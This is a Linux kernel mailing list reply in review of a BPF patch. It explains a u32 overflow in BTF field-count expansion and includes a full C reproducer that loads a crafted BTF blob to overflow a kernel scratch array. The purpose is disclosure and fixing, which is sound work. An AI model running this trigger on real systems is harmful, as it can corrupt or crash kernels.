Received: from mail-4317.protonmail.ch (mail-4317.protonmail.ch [185.70.43.17])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id BCE681A6813;
	Sun,  7 Jun 2026 17:53:44 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=185.70.43.17
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1780854828; cv=none; b=hhTqR9LVmu+JBehz+fS3IxYN1VQstxf3/1D2MLL1wfiiqZQmsnCexlOSLd4WlOUAVMpd3o/dFjrO08J2r+w5xnLip4WnPqw41JRboVwxrgWOYJD6r6XKX50iDZACruCxDdslcZTNpCORknGESb5ZuFYgH2NNa6HJOCk2b9ecBWs=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1780854828; c=relaxed/simple;
	bh=p/bHsc5YHGZa281e53YytBiFpnR7omyH0e9yoXl0WQg=;
	h=Date:To:From:Cc:Subject:Message-ID:In-Reply-To:References:
	 MIME-Version:Content-Type; b=OBkK7iKQZrjkI4ExFDhUIkH4ICVxvNdUipS98ZAp/24//J+UCbPpe0l+rRUz7ToRCjXSelRyqhidr6FsVnfoFfxVQ6i/iVGl6kXdN8qEbE0Vv0oy7+mdExRLDL/VStTkf7Q3ZdxMpEJz2TAF7UMqMJW736YMXv/3PT3I9ir/2hE=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=1g4.org; spf=pass smtp.mailfrom=1g4.org; dkim=pass (2048-bit key) header.d=1g4.org header.i=@1g4.org header.b=v4uN6sQR; arc=none smtp.client-ip=185.70.43.17
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=1g4.org
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=1g4.org
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=1g4.org header.i=@1g4.org header.b="v4uN6sQR"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=1g4.org;
	s=protonmail2; t=1780854821; x=1781114021;
	bh=rPmNPkqPeD17J1C8bhg8sIXUeSnrw/25puTS7EelNoY=;
	h=Date:To:From:Cc:Subject:Message-ID:In-Reply-To:References:
	 Feedback-ID:From:To:Cc:Date:Subject:Reply-To:Feedback-ID:
	 Message-ID:BIMI-Selector;
	b=v4uN6sQRfFxk0qqDDwfYuUy6y6HmfA68x6MHt+pdX643UJdaz6lVzcm1esz/RNSNs
	 ZL5Ly4ow2+RH/2un6CMZImILeoKp4KyeeQ04o/Clb5jrNeetc7mUUuiYpGSWiWfJVs
	 E0JXKjZum8Qa1GSFXi2vQD02ZuilZ85E4MhUKlMtgZGuFN+l8NSqr5tnclmTk8YxkH
	 xnNLYzFz5qGeCEv/kfbO6FkEPiCGbh1nS88xxre7cDc2Cs6MK1HIgoiYA4i200WcQw
	 IdAwzxj3du25FDZHDRF23+DKCXPm9dlMRYbO46iNex0dbaZBKv1vqEvN6B0P4nrlWF
	 bnaK1aO81TdHw==
Date: Sun, 07 Jun 2026 17:53:37 +0000
To: Kumar Kartikeya Dwivedi <memxor@gmail.com>
From: Paul Moses <p@1g4.org>
Cc: martin.lau@linux.dev, ast@kernel.org, daniel@iogearbox.net, andrii@kernel.org, eddyz87@gmail.com, bpf@vger.kernel.org, song@kernel.org, yonghong.song@linux.dev, jolsa@kernel.org, houtao1@huawei.com, linux-kernel@vger.kernel.org, stable@vger.kernel.org
Subject: Re: [PATCH bpf] bpf: Validate BTF repeated field counts before expansion
Message-ID: <0_PQcsqBnb7dqgu9UPK6jIQvePSosttml5p2ZDoXAzy2AseVjvBu3ihswwZPWr5bZkOUCdH6HUvw3MRKJEwVYJAkT3j5gdNBHZp8l7_cP6Y=@1g4.org>
In-Reply-To: <DJ2RQ5NHDCZT.2R218ZSS80NQ4@gmail.com>
References: <20260605234301.1109063-1-p@1g4.org> <DJ2OZSCSEVEI.3APUCE7ML9X4Q@gmail.com> <E0xEdilT0Z6figMeDAyw03ex29iX0RfOAUXuh4aTJxUrKHK2Bg5N8lKCHNvQoQQ1UzndFFqDJ_zmAMYHLqSgSfF1menSW7C9VKDSBhYrTT0=@1g4.org> <DJ2RQ5NHDCZT.2R218ZSS80NQ4@gmail.com>
Feedback-ID: 8253658:user:proton
X-Pm-Message-ID: d1771357e8570fc26cbdd1e325c00b20143c1505
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

>=20
> Right, I know you can get a splat. But how did you stumble on it? Is this=
 BTF
> produced during compilation, or hand-crafted case meant to exercise the l=
imits
> such that we get the splat? If you have a small reproducer, it might make=
 sense
> to include it as a selftest as well.

Yes, it could be converted to a test, it's intended to produce the splat. I=
'll=20
work on that.

>=20
> The callers of this function do:
>         if (nelems > 1) {
>                 err =3D btf_repeat_fields(info, info_cnt, ret, nelems - 1=
, t->size);
>=20
> so repeat_cnt cannot overflow.
>=20
> 'ret' (which is field_cnt) comes from btf_find_struct_field().
> To overflow the struct needs to have 32k valid fields.
> Is this really what is happening?
>=20
> The issues is deeper. Please have a reliable reproducer first.
>=20
>=20

The repro is 100% reliable, the array repeat count is derived from=20
nelems - 1, so repeat_cnt + 1 recovers nelems. The overflow is in=20
the u32 multiplication of the number of fields by the number of=20
array elements. A small field count can still wrap when multiplied by=20
a large array element count. 10 * 429496730 wraps from 0x100000004 to 4,=20
allowing the capacity check to pass before btf_repeat_fields() copies=20
past the fixed scratch array.


#define _GNU_SOURCE
#include <errno.h>
#include <linux/bpf.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

#ifndef __NR_bpf
#error "__NR_bpf is required for this probe"
#endif

#define LOCAL_BTF_MAGIC 0xeb9fU
#define LOCAL_BTF_VERSION 1U
#define LOCAL_BTF_KIND_INT 1U
#define LOCAL_BTF_KIND_PTR 2U
#define LOCAL_BTF_KIND_ARRAY 3U
#define LOCAL_BTF_KIND_STRUCT 4U
#define LOCAL_BTF_KIND_TYPE_TAG 18U
#define LOCAL_BTF_INFO(kind, vlen) (((kind) << 24) | (vlen))
#define LOCAL_BTF_INT_BITS(bits) (bits)

#define TYPE_ID_INT 1U
#define TYPE_ID_TARGET 2U
#define TYPE_ID_KPTR_TAG 3U
#define TYPE_ID_KPTR_PTR 4U
#define TYPE_ID_SPIN_LOCK 5U
#define TYPE_ID_OUTER 6U
#define TYPE_ID_ARRAY 7U
#define TYPE_ID_ELEM 8U

#define ELEM_FIELD_COUNT 10U
#define ELEM_SIZE 8U
#define OUTER_ARRAY_OFFSET_BYTES 8U
#define OUTER_ARRAY_NELEMS 429496730U
#define OUTER_VALUE_SIZE (OUTER_ARRAY_OFFSET_BYTES + (ELEM_SIZE * OUTER_ARR=
AY_NELEMS))

struct local_btf_header {
=09uint16_t magic;
=09uint8_t version;
=09uint8_t flags;
=09uint32_t hdr_len;
=09uint32_t type_off;
=09uint32_t type_len;
=09uint32_t str_off;
=09uint32_t str_len;
=09uint32_t layout_off;
=09uint32_t layout_len;
};

struct local_btf_type {
=09uint32_t name_off;
=09uint32_t info;
=09uint32_t size_or_type;
};

struct local_btf_member {
=09uint32_t name_off;
=09uint32_t type;
=09uint32_t offset;
};

struct local_btf_array {
=09uint32_t type;
=09uint32_t index_type;
=09uint32_t nelems;
};

struct bytes {
=09uint8_t *data;
=09size_t len;
=09size_t cap;
};

static int append_bytes(struct bytes *out, const void *src, size_t len)
{
=09if (len > out->cap || out->len > out->cap - len)
=09=09return -1;
=09memcpy(out->data + out->len, src, len);
=09out->len +=3D len;
=09return 0;
}

static int append_type(struct bytes *out, uint32_t name_off, uint32_t kind,
=09=09       uint32_t vlen, uint32_t size_or_type)
{
=09struct local_btf_type type =3D {
=09=09.name_off =3D name_off,
=09=09.info =3D LOCAL_BTF_INFO(kind, vlen),
=09=09.size_or_type =3D size_or_type,
=09};

=09return append_bytes(out, &type, sizeof(type));
}

static int append_u32(struct bytes *out, uint32_t value)
{
=09return append_bytes(out, &value, sizeof(value));
}

static int append_member(struct bytes *out, uint32_t name_off, uint32_t typ=
e,
=09=09=09 uint32_t bit_offset)
{
=09struct local_btf_member member =3D {
=09=09.name_off =3D name_off,
=09=09.type =3D type,
=09=09.offset =3D bit_offset,
=09};

=09return append_bytes(out, &member, sizeof(member));
}

static int append_array(struct bytes *out, uint32_t type, uint32_t index_ty=
pe,
=09=09=09uint32_t nelems)
{
=09struct local_btf_array array =3D {
=09=09.type =3D type,
=09=09.index_type =3D index_type,
=09=09.nelems =3D nelems,
=09};

=09return append_bytes(out, &array, sizeof(array));
}

static uint32_t add_string(struct bytes *strings, const char *value)
{
=09uint32_t offset =3D (uint32_t)strings->len;
=09size_t len =3D strlen(value) + 1U;

=09if (append_bytes(strings, value, len) < 0)
=09=09return UINT32_MAX;
=09return offset;
}

static int build_btf_blob(uint8_t *blob, size_t blob_cap, size_t *blob_len)
{
=09uint8_t type_buf[1024];
=09uint8_t str_buf[512] =3D { 0 };
=09struct bytes types =3D { .data =3D type_buf, .len =3D 0, .cap =3D sizeof=
(type_buf) };
=09struct bytes strings =3D { .data =3D str_buf, .len =3D 1, .cap =3D sizeo=
f(str_buf) };
=09uint32_t str_int =3D add_string(&strings, "int");
=09uint32_t str_target =3D add_string(&strings, "target");
=09uint32_t str_kptr =3D add_string(&strings, "kptr_untrusted");
=09uint32_t str_spin =3D add_string(&strings, "bpf_spin_lock");
=09uint32_t str_outer =3D add_string(&strings, "outer");
=09uint32_t str_lock =3D add_string(&strings, "lock");
=09uint32_t str_items =3D add_string(&strings, "items");
=09uint32_t str_elem =3D add_string(&strings, "elem");
=09uint32_t str_fields[ELEM_FIELD_COUNT];
=09struct local_btf_header header;
=09struct bytes full =3D { .data =3D blob, .len =3D 0, .cap =3D blob_cap };
=09uint32_t i;

=09for (i =3D 0; i < ELEM_FIELD_COUNT; i++) {
=09=09char name[8];

=09=09snprintf(name, sizeof(name), "f%u", i);
=09=09str_fields[i] =3D add_string(&strings, name);
=09}
=09if (str_int =3D=3D UINT32_MAX || str_target =3D=3D UINT32_MAX || str_kpt=
r =3D=3D UINT32_MAX ||
=09    str_spin =3D=3D UINT32_MAX || str_outer =3D=3D UINT32_MAX || str_loc=
k =3D=3D UINT32_MAX ||
=09    str_items =3D=3D UINT32_MAX || str_elem =3D=3D UINT32_MAX)
=09=09return -1;
=09for (i =3D 0; i < ELEM_FIELD_COUNT; i++) {
=09=09if (str_fields[i] =3D=3D UINT32_MAX)
=09=09=09return -1;
=09}

=09if (append_type(&types, str_int, LOCAL_BTF_KIND_INT, 0, 4) < 0 ||
=09    append_u32(&types, LOCAL_BTF_INT_BITS(32)) < 0 ||
=09    append_type(&types, str_target, LOCAL_BTF_KIND_STRUCT, 0, 1) < 0 ||
=09    append_type(&types, str_kptr, LOCAL_BTF_KIND_TYPE_TAG, 0, TYPE_ID_TA=
RGET) < 0 ||
=09    append_type(&types, 0, LOCAL_BTF_KIND_PTR, 0, TYPE_ID_KPTR_TAG) < 0 =
||
=09    append_type(&types, str_spin, LOCAL_BTF_KIND_STRUCT, 0, 4) < 0 ||
=09    append_type(&types, str_outer, LOCAL_BTF_KIND_STRUCT, 2, OUTER_VALUE=
_SIZE) < 0 ||
=09    append_member(&types, str_lock, TYPE_ID_SPIN_LOCK, 0) < 0 ||
=09    append_member(&types, str_items, TYPE_ID_ARRAY, OUTER_ARRAY_OFFSET_B=
YTES * 8U) < 0 ||
=09    append_type(&types, 0, LOCAL_BTF_KIND_ARRAY, 0, 0) < 0 ||
=09    append_array(&types, TYPE_ID_ELEM, TYPE_ID_INT, OUTER_ARRAY_NELEMS) =
< 0 ||
=09    append_type(&types, str_elem, LOCAL_BTF_KIND_STRUCT, ELEM_FIELD_COUN=
T, ELEM_SIZE) < 0)
=09=09return -1;
=09for (i =3D 0; i < ELEM_FIELD_COUNT; i++) {
=09=09if (append_member(&types, str_fields[i], TYPE_ID_KPTR_PTR, 0) < 0)
=09=09=09return -1;
=09}

=09memset(&header, 0, sizeof(header));
=09header.magic =3D LOCAL_BTF_MAGIC;
=09header.version =3D LOCAL_BTF_VERSION;
=09header.hdr_len =3D sizeof(header);
=09header.type_off =3D 0;
=09header.type_len =3D (uint32_t)types.len;
=09header.str_off =3D (uint32_t)types.len;
=09header.str_len =3D (uint32_t)strings.len;

=09if (append_bytes(&full, &header, sizeof(header)) < 0 ||
=09    append_bytes(&full, types.data, types.len) < 0 ||
=09    append_bytes(&full, strings.data, strings.len) < 0)
=09=09return -1;

=09*blob_len =3D full.len;
=09return 0;
}

static long load_reviewed_btf_variant(void)
{
=09uint8_t blob[4096];
=09char log_buf[4096];
=09union bpf_attr attr;
=09size_t blob_len =3D 0;

=09memset(log_buf, 0, sizeof(log_buf));
=09memset(&attr, 0, sizeof(attr));
=09if (build_btf_blob(blob, sizeof(blob), &blob_len) < 0)
=09=09return -2;

=09attr.btf =3D (uint64_t)(uintptr_t)blob;
=09attr.btf_size =3D (uint32_t)blob_len;
=09attr.btf_log_buf =3D (uint64_t)(uintptr_t)log_buf;
=09attr.btf_log_size =3D sizeof(log_buf);
=09attr.btf_log_level =3D 1;

=09printf("btf_invalid_variant: submitting reviewed BTF payload size=3D%zu =
nelems=3D%u\n",
=09       blob_len, OUTER_ARRAY_NELEMS);
=09errno =3D 0;
=09return syscall(__NR_bpf, BPF_BTF_LOAD, &attr, sizeof(attr));
}

int main(void)
{
=09long ret =3D load_reviewed_btf_variant();
=09int saved_errno =3D errno;

=09if (ret =3D=3D -2) {
=09=09printf("btf_invalid_variant: failed to build bounded BTF payload\n");
=09=09return 1;
=09}
=09printf("btf_invalid_variant: BPF_BTF_LOAD ret=3D%ld errno=3D%d (%s)\n",
=09       ret, saved_errno, strerror(saved_errno));
=09printf("btf_invalid_variant: bounded invalid-access attempt complete\n")=
;
=09return 0;
}

